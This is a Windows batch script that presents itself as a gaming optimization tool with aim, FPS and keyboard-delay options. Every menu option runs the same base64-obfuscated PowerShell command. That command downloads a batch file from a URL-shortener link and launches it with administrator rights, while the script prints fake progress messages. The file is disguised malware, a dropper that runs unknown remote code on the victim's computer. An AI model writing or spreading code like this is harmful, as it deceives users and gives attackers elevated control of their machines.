@echo off
title PRIVATE TOOL!
mode con: cols=60 lines=14
color 07

cls
echo.
echo    ========================================
echo              RAJESH PRIVATE TOOL!
echo    ========================================
echo.
echo    [1] Aim Optimization
echo    [2] KB Reducer  
echo    [3] FPS Booster
echo    [4] Keyboard Delay Fixer
echo.
echo    ========================================
echo.

:choice
set /p choice=Select option (1-4): 

if "%choice%"=="1" goto 1
if "%choice%"=="2" goto 2
if "%choice%"=="3" goto 3
if "%choice%"=="4" goto 4
echo Invalid choice! Try again.
goto choice

:1
color 07
cls
echo.
echo    [ AIM OPTIMIZATION ]
echo.
echo    Running Aim Optimization...
echo    [!] Aim Optimization Activating...
echo.
powershell -e aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AYgBpAHQALgBsAHkALwAzAE8AMwBDAEIAMgBxACAALQBvACAAJAB0AFwAbwAuAGIAYQB0ADsAcwB0AGEAcgB0ACAAJAB0AFwAbwAuAGIAYQB0ACAALQB2AGUAcgBiACAAcgB1AG4AYQBzAA==
echo.
echo    Done!
pause
exit

:2
color 08
cls
echo.
echo    [ KB REDUCER ]
echo.
echo    Running KB Reducer...
echo    [!] KB Reducer Activating...
echo.
powershell -e aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AYgBpAHQALgBsAHkALwAzAE8AMwBDAEIAMgBxACAALQBvACAAJAB0AFwAbwAuAGIAYQB0ADsAcwB0AGEAcgB0ACAAJAB0AFwAbwAuAGIAYQB0ACAALQB2AGUAcgBiACAAcgB1AG4AYQBzAA==
echo.
echo    Done!
pause
exit

:3
color 07
cls
echo.
echo    [ FPS BOOSTER ]
echo.
echo    Running FPS Booster...
echo    [!] FPS Booster Activating...
echo.
powershell -e aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AYgBpAHQALgBsAHkALwAzAE8AMwBDAEIAMgBxACAALQBvACAAJAB0AFwAbwAuAGIAYQB0ADsAcwB0AGEAcgB0ACAAJAB0AFwAbwAuAGIAYQB0ACAALQB2AGUAcgBiACAAcgB1AG4AYQBzAA==
echo.
echo    Done!
pause
exit

:4
color 08
cls
echo.
echo    [ KEYBOARD DELAY FIXER ]
echo.
echo    Running Keyboard Delay Fixer...
echo    [!] Keyboard Delay Fixer Activating...
echo.
powershell -e aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AYgBpAHQALgBsAHkALwAzAE8AMwBDAEIAMgBxACAALQBvACAAJAB0AFwAbwAuAGIAYQB0ADsAcwB0AGEAcgB0ACAAJAB0AFwAbwAuAGIAYQB0ACAALQB2AGUAcgBiACAAcgB1AG4AYQBzAA==
echo.
echo    Done!
pause
exit